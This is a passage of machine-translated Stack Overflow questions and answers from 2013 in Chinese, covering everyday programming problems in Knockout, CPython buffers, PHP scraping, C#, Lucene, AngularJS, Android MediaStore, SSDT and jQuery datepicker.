我曾多次尝试区分 iPad 联系人和来自不同服务器的其他同步联系人，但我一直无法找到区分的方法。我们怎样才能得到源？我想要我们在 iPad 或 iPhone 中同步联系人的帐户名或用户名。

```
CFTypeRef sourceTypeEx; CFArrayRef sources = ABAddressBookCopyArrayOfAllSources(addressBook); CFIndex sourceCount = CFArrayGetCount(sources);

for (CFIndex i = 0 ; i < sourceCount; i++){  
    ABRecordRef currentSource = CFArrayGetValueAtIndex(sources, i);
    sourceTypeEx = ABRecordCopyValue(currentSource, kABSourceTypeExchange);
    NSString *obj = [NSString stringWithFormat:@"%@",sourceTypeEx];    
} 
```

# javascript - 如何使用 Knockout 禁用点击事件？

> ID：15244254
> 
> 赞同：6
> 
> 时间：2013-03-06T10:05:41.867
> 
> 标签：javascript, jquery, knockout.js

我有两个按钮，称为

```
<a href='#' data-bind='click: clickActivateSpatialSearch' id='draw_polygon'>
<a href='#' data-bind='click: clickActivateSpatialSearchBox' id='draw_box'> 
```

这里最好的是什么？我可以使用 jQuery`$(document).ready`吗？问题是数据绑定单击会在按下时禁用另一个单击事件，同样如此。但是当我按下同一个按钮时，它会再次启用第二个按钮。

所以我想说的是，我一次只希望启用一个按钮。这可以与淘汰赛一起合作吗？如果是这样，请告诉我如何。PS：我看过关于启用的淘汰赛网站，但我不明白。我应该如何让它充分发挥作用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:18:28.600

当我们有这样的代码时，knockoutjs 启用功能将起作用

最初，两个链接都处于活动状态。如果您单击任何一个链接，它会禁用另一个链接。如果您再次单击该链接，它将启用另一个链接。

**这不是您所要求的答案.. 这是启用如何与淘汰赛一起工作的答案**

你只需要一个按钮启用，那么必须有一些条件，用这个启用绑定应用这些条件，这样就解决了所有问题。

html:-

```
<input type="text" data-bind="enable: linkTwo() != 'clicked',click: clickActivateSpatialSearch" id='draw_polygon'/>
<input type="text" data-bind="enable: linkOne() != 'clicked',click: clickActivateSpatialSearchBox" id='draw_box'/> 
```

脚本：-

```
var self = this;
self.linkOne = ko.observable();
self.linkTwo = ko.observable();

self.clickActivateSpatialSearch = function(){ 
  if(self.linkOne() != 'clicked'){
      self.linkOne('clicked'); 
  } 
  else{
    self.linkOne('notClicked');
  }
// some code here
};

self.clickActivateSpatialSearchBox= function(){
  if(self.linkTwo() != 'clicked'){
      self.linkTwo('clicked'); 
  } 
  else{
    self.linkTwo('notClicked');
  }
// some code here
}; 
```

**注意：启用和禁用绑定不适用于锚标记。它适用于输入、文本区域、选择..**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:16:16.413

您可以添加一个 observable 来保存按下哪个按钮，然后将 click 更改为检查 observable 的函数：

```
<a href='#' data-bind='click: function() { 
    if(buttonClickedObservable() == 'polygon')
    {
        clickActivateSpatialSearch();
    }' id='draw_polygon'>
<a href='#' data-bind='click: function() { 
    if(buttonClickedObservable() == 'box')
    {
        clickActivateSpatialSearchBox'();
    }' id='draw_box'> 
```

不过，您必须决定如何设置 observable。

# python - 使用具有不同项目大小的 Py_buffer 和 PyMemoryView_FromBuffer

> ID：15244255
> 
> 赞同：5
> 
> 时间：2013-03-06T10:05:43.890
> 
> 标签：python, cpython, pybuffer, pep3118

这个问题与我之前提出的问题有关。如果有人感兴趣，那就是这个[。](https://stackoverflow.com/questions/15033683/calling-a-python-function-from-a-c-thread-with-a-mutable-c-array)基本上，我想做的是使用`Py_buffer`包装在`memoryview`-object 中的 C 数组向 Python 公开。我已经使用它来工作`PyBuffer_FillInfo`（工作=我可以在 Python 中操作数据并将其写入 C 中的标准输出），但是如果我尝试滚动我自己的缓冲区，我会在 C 函数返回*后得到一个段错误。*

我需要创建自己的缓冲区，因为 PyBuffer_FillInfo 假定格式为 char，使 itemsize 字段为 1。我需要能够提供大小为 1、2、4 和 8 的项目。

一些代码，这是一个工作示例：

```
Py_buffer *buf = (Py_buffer *) malloc(sizeof(*buf));
int r = PyBuffer_FillInfo(buf, NULL, malloc(sizeof(char) * 4), 4, 0, PyBUF_CONTIG);
PyObject *mv = PyMemoryView_FromBuffer(buf);
//Pack the memoryview object into an argument list and call the Python function
for (blah)
  printf("%c\n", *buf->buf++); //this prints the values i set in the Python function 
```

查看`PyBuffer_FillInfo`非常简单的实现，我推出了自己的函数以提供自定义项目大小：

```
//buffer creation function
Py_buffer *getReadWriteBuffer(int nitems, int itemsize, char *fmt) {
  Py_buffer *buf = (Py_buffer *) malloc(sizeof(*buf));
  buf->obj = NULL
  buf->buf = malloc(nitems * itemsize);
  buf->len = nitems * itemsize;
  buf->readonly = 0;
  buf->itemsize = itemsize;
  buf->format = fmt;
  buf->ndim = 1;
  buf->shape = NULL;
  buf->strides = NULL;
  buf->suboffsets = NULL;
  buf->internal = NULL;
  return buf;
} 
```

我如何使用它：

```
Py_buffer *buf = getReadWriteBuffer(32, 2, "h");
PyObject *mv = PyMemoryView_FromBuffer(buf);
// pack the memoryview into an argument list and call the Python function as before

for (blah)
  printf("%d\n", *buf->buf); //this prints all zeroes even though i modify the array in Python

return 0;
//the segfault happens somewhere after here 
```

使用我自己的缓冲区对象的结果是C函数返回后的段错误。我真的不明白为什么会发生这种情况。非常感激任何的帮助。

**编辑** 根据[这个](https://stackoverflow.com/questions/2297026/assignment-into-python-3-x-buffers-with-itemsize-1?rq=1)我之前没找到的问题，itemsize > 1 可能根本不被支持。这使得这个问题更加有趣。也许我可以使用`PyBuffer_FillInfo`足够大的内存块来保存我想要的东西（例如 32 个 C 浮点数）。在这种情况下，问题更多是关于如何将 Python 浮点数分配给`memoryview`Python 函数中的对象。提问提问。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-08T10:53:15.957

因此，在缺乏答案的情况下，我决定采用另一种方法，而不是我最初打算的方法。把这个留在这里，以防其他人遇到同样的障碍。

基本上，不是在 C 中创建缓冲区（或字节数组，等价）并将其传递给 Python 以供扩展用户修改。我只是稍微重新设计了代码，以便用户从 Python 回调函数返回一个字节数组（或任何支持缓冲区接口的类型）。这样我什至不必担心项目的大小，因为在我的例子中，所有 C 代码对返回的对象所做的就是提取其缓冲区并将其复制到另一个带有简单`memcpy`.

代码：

```
PYGILSTATE_ACQUIRE; //a macro i made
PyObject *result = PyEval_CallObject(python_callback, NULL);
if (!PyObject_CheckBuffer(result))
  ; //raise exception

Py_buffer *view = (Py_buffer *) malloc(sizeof(*view));
int error = PyObject_GetBuffer(result, view, PyBUF_SIMPLE);
if (error)
  ; //raise exception

memcpy(my_other_buffer, view->buf, view->len);

PyBuffer_Release(view);
Py_DECREF(result);
PYGILSTATE_RELEASE; //another macro 
```

我希望这可以帮助别人。

# php - 如何使用 PHP Simple HTML DOM 获取 html 的某些部分

> ID：15244261
> 
> 赞同：0
> 
> 时间：2013-03-06T10:06:01.597
> 
> 标签：php, simple-html-dom

我有这样结构的html页面

```
<div id="1">
  <div id="2">
    <div id="3">
      <div id="4">
        <div id="5">   
          <div id="photo">    
            <a id="photo" href="link">
              <img width="200" src="http://site.com/photo.jpg"> 
            </a> 
          </div>
          <div id="info"></div>
        </div>
      </div> 
    </div> 
  </div> 
</div> 
```

我需要获取 img url ( [http://site.com/...](http://site.com/...) )

我的代码：

```
include('simple_html_dom.php');

// Create a DOM object from a URL
$html = file_get_html('http://site.com/123');

// find all div tags with id=gbar
foreach($html->find('img[width="200"]') as $e)
    echo $e->src . '<br>'; 
```

但它不适用于这个网站。
可能有另一种获取图片网址的方法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:09:33.707

应该可能`$html->find('img[width=200]')`没有额外的引号`200`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:38:54.083

正如预期的那样，该站​​点根据用户代理提供不同的内容，以获取您期望的 HTML，您需要让服务器知道您需要“浏览器”版本。例如，您可以删除此行：

```
$html = file_get_html('http://vk.com/durov'); 
```

...并将其替换为以下内容：

```
$context = stream_context_create(array('http' => array(
  'header' => 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17'
)));
$html = str_get_html( file_get_contents('http://vk.com/durov', false, $context) ); 
```

我应该注意到，欺骗 User-Agent 的做法通常是不受欢迎的，您也许应该运行它来查看包含的信息是否适合您的需求：

```
<?php
  header('Content-type: text/plain');
  echo file_get_contents('http://siteurl.com'); 
```

这将显示网站希望机器人看到的源代码 - 对于有问题的网站，这是页面的轻量级版本 - 从您的角度来看，它需要更少的时间来处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:52:21.857

您可以使用正则表达式来查找它，例如：

```
<?php 
$string = '
<div id="1">
  <div id="2">
    <div id="3">
      <div id="4">
        <div id="5">   
          <div id="photo">    
            <a id="photo" href="link">
              <img width="200" src="http://site.com/photo.jpg"> 
            </a> 
          </div>
          <div id="info"></div>
        </div>
      </div> 
    </div> 
  </div> 
</div> ';

$pattern = '/http[^""]+/';
preg_match($pattern, $string, $matches);
print_r($matches); 
```

印刷：

```
Array
(
    [0] => http://site.com/photo.jpg
) 
```

# soap - 如果根据 wsdl 和 xsd 的 wsa:Address 和 wsa:Action 错误，那该怎么办？

> ID：15244262
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:02.237
> 
> 标签：soap, cxf

如果根据 wsdl 和 xsd 的 wsa:Address 和 wsa:Action 是错误的，那么我们是否必须处理该请求或什么？我已经搜索它，但没有得到它。

# c# - 如何从字符串中删除字符组合？

> ID：15244265
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:06.010
> 
> 标签：c#, .net, string

例如，我有一个字符串，如：

```
string str = "santhosh,ravi,phani,praveen,sathish,prakash"; 
```

现在，我需要`,phani`从`str`. 谁能帮我？我尝试使用`trim`and `substring`. 但我没有得到。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:07:26.320

试试下面的，

```
str = str.Replace(",phani", string.Empty); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:08:26.197

您可以为此使用[`String.Replace()`](http://msdn.microsoft.com/en-us/library/system.string.replace.aspx)方法；

> 返回一个新字符串，其中当前字符串中出现的所有指定 Unicode 字符或字符串都替换为另一个指定的 Unicode 字符或字符串。

```
string str = "santhosh,ravi,phani,praveen,sathish,prakash";
str = str.Replace(",phani", "");
Console.WriteLine(str); 
```

这是一个**[演示](http://ideone.com/V9AVGb)**。

# filter - HP ALM：使用预定义过滤器提取目标版本的缺陷

> ID：15244266
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:08.350
> 
> 标签：filter, hp-quality-center, defects

我尝试使用预定义的过滤器提取与目标版本相关的所有缺陷，以便使用 VBA 将数据导出到 excel 中。

谁能帮我？目前，我不知道如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-20T20:17:55.380

首先，确保为所有缺陷填写与发布相关的字段。然后，

1.  转到缺陷模块
2.  在缺陷网格中，网格顶部有一个带有绿色表格的小按钮，即“选择列”按钮。
3.  按“选择列”按钮
4.  使用箭头将释放字段从隐藏字段列表移动到网格上显示的字段列表（使用箭头将其从 LHS 列表移动到 RHS 列表）
5.  现在该版本将出现在缺陷网格顶部。
6.  在字段名称下，有一个白色的编辑框，用于使用该字段进行网格过滤，所有其他字段都相同。
7.  单击该字段，将显示一个列表，您可以从中选择目标版本。
8.  缺陷网格将按您选择的版本进行过滤。
9.  现在您可以按 Shift+A 选择整个网格，然后右键单击其中一个缺陷并选择导出，然后选择全部。
10.  将显示弹出窗口供您键入文件名并保存。您的缺陷网格将被导出到 Excel 工作表，并且导出到该工作表的所有列都只是出现在 QC 缺陷网格上的列。

# java - 如何获取lucene中的文档总数

> ID：15244267
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:08.680
> 
> 标签：java, spring, hibernate, lucene, hibernate-search

我的索引中有大量文档，我需要编写一个方法来返回 lucence 索引中的文档总数。目前我使用 * 通配符来获取所有记录并返回 totalHits 的值。

问题是，当查询加载所有对象时，虽然我不需要加载对象，但我的要求是在不加载文档的情况下获取记录总数。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-06T15:14:06.087

您可以使用索引阅读器：

```
IndexReader reader = IndexReader.open(FSDirectory.open(indexDirectory));
int num = reader.numDocs(); 
```

暗里

# asp.net - 原版 ASP.NET 和 REST

> ID：15244269
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:11.293
> 
> 标签：asp.net, rest

我希望实现将与 ASP 站点集成的 REST 服务（基本上是同一个项目）。

我试图提供我的自定义`VirtualPathProvider`( `VPP`) 并且它有效，但在一定程度上。首先，`content-type`响应的总是`application/octet-stream`。其次，只有`GET`请求通过管道传输`VPP`。我见过有人玩弄`HttpApplication`解决这些问题。我不确定我是否希望遵循破解 ASP 的道路，因为这可能需要很多时间，最终可能根本无法完成任务。

有没有办法做到这一点，或者我应该为 MVC 创建一个单独的页面，并通过一些进程间通信与之交谈。这样 MVC 将处理 REST 请求并调用我的代码作为响应。*反之亦然*- ASP 将能够向远程服务器发送 REST 请求。

如果有任何其他更清洁、更安全、更简单的方式将 MVC 与 vanilla ASP 联系起来，请随时在评论/答案中发布它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:10:59.823

`VirtualPathProvider`旨在为内部 ASP.NET 操作（例如将 *.aspx 和 *.master 文件存储在数据库中）虚拟化文件系统的一种方式，它适用于用户提供的 URI 和请求只是巧合。

最好的办法是使用 ASP.NET MVC，它现在与 ASP.NET（自 4.x 起）集成或作为 .NET 3.x 中易于再分发的组件。ASP.NET MVC 在同一个应用程序中与 WinForms 配合得很好，所以不要重新发明轮子。

但是，如果您坚持，唯一真正的选择是在`IHttpHandler`选择是否处理传入请求的自定义中完成所有操作（因为您没有使用 ASP.NET URL Routing，因为您没有使用 ASP.NET MVC ）。

# sqlite - 使用 ADO 和 VBScript 在 SQLite 中存储和检索大字符串

> ID：15244270
> 
> 赞同：0
> 
> 时间：2013-03-06T10:06:12.540
> 
> 标签：sqlite, vbscript, odbc, ado

我正在使用 VBscript、ADO 和 SQLite ODBC 驱动程序来存储和检索大字符串 (~5KB)。存储它们工作正常，可能是因为我能够在绑定插入语句的参数时指定大小。但是，当我尝试检索这些字符串时，我正确地获得了前 256 个（或 255 个）字符，但其余的接缝来自随机内存区域。我在做什么错（除了使用 VBscript 和 ADO ...）？

我对将文本存储为二进制数据的想法持开放态度。但是我尝试过的功能，以便稍后检索它，并没有工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-10T13:26:50.533

getChunk 将无法在 msdn 上注明的记录字段上工作，字段属性 adFldLong 也表明 getChunk 是否可以在该字段上使用。在某些字段中，您必须使用 SQL 查询来检索数据的长度，而不是使用属性 actualSize

这里有一个很好的例子[http://kek.ksu.ru/eos/ecommerce/masteringasp/18-06.html](http://kek.ksu.ru/eos/ecommerce/masteringasp/18-06.html)

# javascript - Angularjs错误未知的提供者

> ID：15244272
> 
> 赞同：31
> 
> 时间：2013-03-06T10:06:16.267
> 
> 标签：javascript, angularjs, angularjs-directive

我正在尝试在 html 页面中显示配置的值`author`和`version`角度值服务。版本代码显示正常但不是作者姓名这是 html 代码

```
 <!doctype html>
<html lang="en" ng-app="myApp">
<head>
  <meta charset="utf-8">
  <title>My AngularJS App</title>
  <link rel="stylesheet" href="css/app.css"/>
</head>
<body>
  <ul class="menu">
    <li><a href="#/view1">view1</a></li>
    <li><a href="#/view2">view2</a></li>
  </ul>

  <div ng-view></div>

  <div>Angular seed app: v<span app-version></span></div>
  <div>Author is : <span app-author></span></div>

  <script src="lib/angular/angular.js"></script>
  <script src="js/app.js"></script>
  <script src="js/services.js"></script>
  <script src="js/controllers.js"></script>
  <script src="js/filters.js"></script>
  <script src="js/directives.js"></script>
</body>
</html> 
```

这是指令...

```
angular.module('myApp.directives', []).
  directive('appVersion', ['version', function(version) {
    return function(scope, elm, attrs) {
      elm.text(version);
    };
  }])
  .directive('appAuthor', ['author', function(author) {
    return function(scope, elm, attrs){
        elm.text(author);
    };
  }]); 
```

这是配置`author`和`version`值的服务部分

```
 angular.module('myApp.services', []).
  value('version', '0.1')
  .value('author','JIM'); 
```

我在开发者控制台中遇到的错误是

```
Error: Unknown provider: authorProvider <- author <- appAuthorDirective 
```

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-03-06T11:43:05.910

确保将这些模块（*myApp.services*和*myApp.directives*）加载为主应用程序模块的依赖项，如下所示：

```
angular.module('myApp', ['myApp.directives', 'myApp.services']); 
```

**plunker：** [http ://plnkr.co/edit/wxuFx6qOMfbuwPq1HqeM?p=preview](http://plnkr.co/edit/wxuFx6qOMfbuwPq1HqeM?p=preview)

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2014-02-23T20:28:16.280

bmleite 有关于包含模块的正确答案。

如果这在您的情况下是正确的，您还应该确保您没有在多个文件中重新定义模块。

记住：

```
angular.module('ModuleName', [])   // creates a module.

angular.module('ModuleName')       // gets you a pre-existing module. 
```

因此，如果您正在扩展现有模块，请记住在尝试获取它时不要覆盖它。

# java - 用于比较 MP3 内容的 java api？

> ID：15244274
> 
> 赞同：2
> 
> 时间：2013-03-06T10:06:21.313
> 
> 标签：java, audio, mp3

我是新手，我不知道该怎么办？我想比较两个 MP3 文件并检查它们是否相同或不同。我想通过它的内容来检查它。请帮我。我到处搜索，但没有得到任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:11:55.127

您可以使用[番石榴库](https://code.google.com/p/guava-libraries/)

执行`crc32`校验和计算

```
File myfile1 = new File("file1.mp3");
long checksum1 = Files.getChecksum(myfile1 , new java.util.zip.CRC32());

File myfile2 = new File("file2.mp3");
long checksum2 = Files.getChecksum(myfile2 , new java.util.zip.CRC32());

if (checksum1 == checksum2)    {
    System.out.println(" Both are same ");
    // your business logic
} 
```

如果您对校验和不满意并想要进行`sha-256`摘要计算

```
byte[] digest = Files.getDigest(myfile1 , MessageDigest.getInstance("SHA-256")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T15:16:12.380

你说“我到处搜索，但没有得到任何东西。” 如果这是真的，那么你搜索了错误的东西。我刚去谷歌并输入“堆栈溢出检查两首歌曲是否相同”并得到以下两个问题的答案：

[是否可以通过分析文件的字节来查看两个 MP3 文件是否是同一首歌曲？](https://stackoverflow.com/questions/4482906/is-it-possible-to-see-if-two-mp3-files-are-the-same-song-by-analyzing-the-files)

[Java：比较两个音频文件，看看它们是否是相同的“音乐”](https://stackoverflow.com/questions/11988052/java-comparing-two-audio-files-to-see-if-they-are-the-same-music)

您还可以查看[echonest API](http://echonest.com/)和[echoprint](http://echoprint.me/)。

# c# - 必应 API v1 文档

> ID：15244280
> 
> 赞同：3
> 
> 时间：2013-03-06T10:06:32.287
> 
> 标签：c#, bing, bing-api

有谁知道我在哪里可以找到带有以下 URL 的 Bings API 的最新文档：

```
https://api.datamarket.azure.com/Bing/Search/v1/Web 
```

甚至他们自己的网站在我一直在阅读的 word docs 中有错误的 URL，即[https://api.datamarket.azure.com/Bing/SearchWeb/Web](https://api.datamarket.azure.com/Bing/SearchWeb/Web)不起作用。

我可以让搜索工作并返回结果，但无法获得总记录数，如果我使用复合我可以获得记录数但没有结果。

我只是在寻找如何获得计数和结果的最新示例。

这是我到目前为止所拥有的：

```
public class GetBingTotalRecordCount
{
    public IEnumerable<DisplayBingWebSearch> DisplayBingSearchResults(string q)
    {
        string BingID = ConfigurationManager.AppSettings["Bing_WebSearchID"];
        string BingWebSearch
            = ConfigurationManager.AppSettings["Bing_WebSearchURL"];
        var BingContainer = new Bing.BingSearchContainer(new Uri(BingWebSearch));
        BingContainer.Credentials = new NetworkCredential(BingID, BingID);
        var query = BingContainer.Composite("Web", HttpUtility.UrlEncode(q),
            "EnableHighlighting", "DisableQueryAlterations", "en-GB", "Strict",
            null, null, null, null, null, null, null, null, null
        ).Execute().First();

        List<DisplayBingWebSearch> data = new List<DisplayBingWebSearch>();
        foreach (var results in query.Web)
        {
            data.Add(new DisplayBingWebSearch() {
                 WebTitle = results.Title
            });
        }
        return data;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T16:10:45.440

您必须执行自己的计数和分页。

来自 foreach 语句的 results.Count 将获得返回的记录数。

每个查询最多有 50 个结果，您可以使用 $top=x 指定最大结果计数，其中 x 是您想要的最大结果。

前任：`https://user:yourAccountKey@api.datamarket.azure.com/Bing/SearchWeb/Web?Query=%27leo%20fender%27&Market=%27en-US%27&$top=50&$format=JSON"`

Bing 现在在查询中使用 OData 参数，因此 $top 将是要返回的结果数，而 $skip 是偏移量。

可以在[http://go.microsoft.com/fwlink/?LinkID=252146上找到包含 $top 和 $skip 示例的常见问题解答](http://go.microsoft.com/fwlink/?LinkID=252146)

可以在此处找到不太有用的迁移指南[http://go.microsoft.com/fwlink/?LinkID=248077](http://go.microsoft.com/fwlink/?LinkID=248077)

# android - 获取外部卡上的所有 MP3 文件

> ID：15244282
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:43.310
> 
> 标签：android, mp3, mediastore

我想要实现的是在数组列表中获取所有 mp3 文件的 URL 和标题以返回它。全部来自文件夹：/ext_card/Music/ 和所有子文件夹。

我探索的选项似乎都卡住了，我在互联网上查找的所有答案都指向 mediastore，但我不知道如何使用它

并且不要给我 RTFM 废话，因为我为 mediastore 找到的解释充其量是迟钝的。

所以任何人都可以请帮助我或给我一个简单的工作媒体存储查询所有 mp3 文件的例子吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T10:40:52.480

使用它可以帮助您从 SD 卡中获取所有 MP3 歌曲

```
private static ArrayList<genericSongClass> songs = null;

public void BindAllSongs() {        
        /** Making custom drawable */
        String selection = MediaStore.Audio.Media.IS_MUSIC + " != 0";
        final String[] projection = new String[] {
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.ARTIST,
                MediaStore.Audio.Media.DATA};
                final String sortOrder = MediaStore.Audio.AudioColumns.TITLE
                        + " COLLATE LOCALIZED ASC";

                try {
                    // the uri of the table that we want to query
                    Uri uri = android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                    // query the db
                    cursor = getBaseContext().getContentResolver().query(uri,
                            projection, selection, null, sortOrder);
                    if (cursor != null) {
                        songs = new ArrayList<genericSongClass>(cursor.getCount());
                        cursor.moveToFirst();                       
                        while (!cursor.isAfterLast()) { 
                            GSC = new genericSongClass();
                            GSC.songTitle = cursor.getString(0);
                            GSC.songArtist = cursor.getString(1);   
                            GSC.songData = cursor.getString(2);
                            songs.add(GSC);
                            cursor.moveToNext();
                        }
                    }
                } catch (Exception ex) {

                } finally {
                    if (cursor != null) {
                        cursor.close();
                    }
                }       

    }

public class genericSongClass {
        String songTitle = "";
        String songArtist = "";
        String songData = "";
        String isChecked = "false";
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-06T10:10:44.537

这是一种递归方式来做这样的事情，

```
getMp3s(Arraylist<File> list, File dir){
    File[] files = dir.listFiles();
    for(File file : files){
        if(file.isDirectory()){
            getMp3s(list, file);
        }else{
            //add mp3s to list here
        }
    }
} 
```

# sql-server - SQL Server Data Tools (SSDT) - 在部署时确定数据类型？

> ID：15244286
> 
> 赞同：1
> 
> 时间：2013-03-06T10:06:50.643
> 
> 标签：sql-server, visual-studio, sql-server-data-tools, dacpac

有没有人知道在部署时使用 SSDT / dacpac 部署来确定列的数据类型的技术，具体取决于目标 SQL Server 实例上可用的功能？具体例子：

```
CREATE TABLE [HasBlob] (
    [Id] INT PRIMARY KEY,
    [Guid] [uniqueidentifier] ROWGUIDCOL NOT NULL UNIQUE,
    [Data] VARBINARY(MAX) FILESTREAM NULL
) 
```

在这种情况下，如果没有为 SQL Server 实例启用 FILESTREAM，我希望能够自动回退到传统的 VARBINARY(MAX) blob 而不是 FILESTREAM。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T04:29:39.253

一种方法是通过 查询当前数据库的文件组`sys.data_spaces`，例如：

```
IF EXISTS(SELECT * FROM sys.data_spaces WHERE type = 'FD')
BEGIN
-- use create statement with FILESTREAM
END; 
```

# apache-flex - 如何在 flex 中将日期 2012-03-24 更改为 03/24/2013

> ID：15244291
> 
> 赞同：1
> 
> 时间：2013-03-06T10:07:15.387
> 
> 标签：apache-flex, datagrid, flex4.5, date-formatting, advanceddatagrid

```
 override public function set data(value:Object):void
    {

        super.data = value;

        if(data["date"] == ' ') 
        {

                var d:DateFormatter =  new DateFormatter();

                var month4:String = String(value);
                d.formatString = "MM-YY";

        data["date"] =d.format(DateFormatter.parseDateString(month4));
        }       

    } 
```

我想将来自数据库的值更改为 2013-03-24 到 03/24/2013 请告诉我该怎么做...我不需要任何硬代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T14:51:56.727

您不需要格式化日期，只需添加组件`formatString`的属性，`dateField`如`formatString="MM/DD/YYYY"`. 它将以提供的格式显示您的日期。Flex`dateFiled`组件已经具备此功能。

# php - 链接 1 个变量中的 2 个变量

> ID：15244296
> 
> 赞同：0
> 
> 时间：2013-03-06T10:07:29.780
> 
> 标签：php, url

我想知道这个文件的文件大小是filesize()。

使用回声它可以工作：

$数据[文本文件]；= 以数据库结尾的完整文件名

```
echo 'http://myurl.com/files/'.$Data[id].'/'.$Data[textFile].''; 
```

但它不是这样工作的：

```
$file = "http://myurl.com/files/" . $Data[id] . "/" . $Data[textFile] . ""; 
```

链接看起来/应该是这样的：

[http://myurl.com/files/123/textfile.docx](http://myurl.com/files/123/textfile.docx)

编辑：对不起我奇怪的英语......我希望这一点很清楚

编辑 2：我想获取 pdf 或 docx 的文件大小

其余代码：

```
$size = filesize($file);
$size = $size/1048576;
$size = round($size,2);
echo $size." Mb"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:09:02.470

尝试：

```
$file = 'http://myurl.com/files/' . $Data[id] . '/' . $Data[textFile]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:11:49.290

尝试`$file = 'http://myurl.com/files/' . $Data['id'] . '/' . $Data['textFile'];`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:13:50.627

尝试`$file = 'http://myurl.com/files/'.$Data[id].'/'.$Data[textFile];`

# php - PHP 目录迭代器构造函数问题

> ID：15244299
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:07:38.597
> 
> 标签：php

我是使用 PHP 目录迭代器的新手。

我的理解是，如果我这样做：

```
 $dir = new DirectoryIterator(dirname("/var/wwwphp")); 
```

然后

```
$dir->getPath(); 
```

应该是 /var/wwwphp ，我可以在该文件夹中开始使用它。但相反，getPath 只给了我 /var。此外，如果我遍历文件，它会给我/var 中的所有文件，而不是/var/wwwphp。

为什么我不能直接进入 wwwphp 文件夹？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:10:41.387

```
$dir = new DirectoryIterator('/var/wwwphp'); 
```

`dirname`显式删除字符串的最后一部分，`DirectoryIterator`唯一能看到的`/var`是你是否使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:11:01.487

如果您检查 dirname 文档，您将看到它“返回父目录的路径”

[http://www.php.net/manual/en/function.dirname.php](http://www.php.net/manual/en/function.dirname.php)

# spring - 在 Spring 中使用其他控制器生成的 html 作为返回页面的一部分

> ID：15244300
> 
> 赞同：1
> 
> 时间：2013-03-06T10:07:38.653
> 
> 标签：spring, controller

在我的 web 应用程序中，我有一个页面，其中显示了许多选项卡，每个选项卡都必须可以通过 AJAX 独立重新加载。为了用户体验，我希望在页面加载时立即显示所有数据，而不是通过 ajax 处理。为了可维护性（并且因为我很懒），我不想为整个页面编写单独的代码.

有没有办法包含通过调用页面中的其他控制器生成的 html？

如果相关的话，我会使用 jsp 来查看视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:20:14.007

更简单的方法是在页面加载事件中手动触发每个选项卡的 AJAX 调用。这将为每个选项卡带来 HTML。这样做的缺点是它会花费你 X 个请求。

另一种选择是为每个标签发送信息的所有其他人创建一个前端控制器。您向前端控制器发送一个请求，它的工作是将其他请求的结果放在一起并给出一个大响应。

# jquery - 为jquery datapicker动态更改css

> ID：15244306
> 
> 赞同：0
> 
> 时间：2013-03-06T10:07:56.373
> 
> 标签：jquery, jquery-ui, datapicker

如何通过 jquery 更改数据选择器的外观。我不想仅隐藏 datapicker ui-datepicker-calendar 类。

有用：

```
 .ui-datepicker-calendar {
       display: none;
    }​ 
```

但这不起作用：

```
 $(function() {
         $("#startdateMyWorkouts").datepicker({ dateFormat: 'dd-mm-yy' });
         $(".ui-datepicker-calendar").css('display','none');
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:17:04.923

尝试使用，`.datepicker("hide")`。你可以在活动中做到这一点。在这里，您正在文档加载中执行此操作

顺便说一句，如果您希望在事件中发生这种情况，请使用以下方式，

```
$(function() {
    $("#startdateMyWorkouts").datepicker({ dateFormat: 'dd-mm-yy',
        beforeShow: function(input, inst) {
           $("#datefilterMyWorkouts").change(function()) { // your select change event
              return false; // to hide the datepicker
           });
        } 
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:21:55.850

我的猜测是，当您尝试隐藏元素时，Datepicker 插件仍在创建元素，因此没有什么可隐藏的！代码很好！

Datepicker API Doc 可能对您有所帮助！：

```
hide() 
```

关闭之前打开的日期选择器。

此方法不接受任何参数。

代码示例：

调用隐藏方法：

```
$( ".selector" ).datepicker( "hide" ); 
```

# c# - 在远程 FTP 上移动文件时出错

> ID：15244312
> 
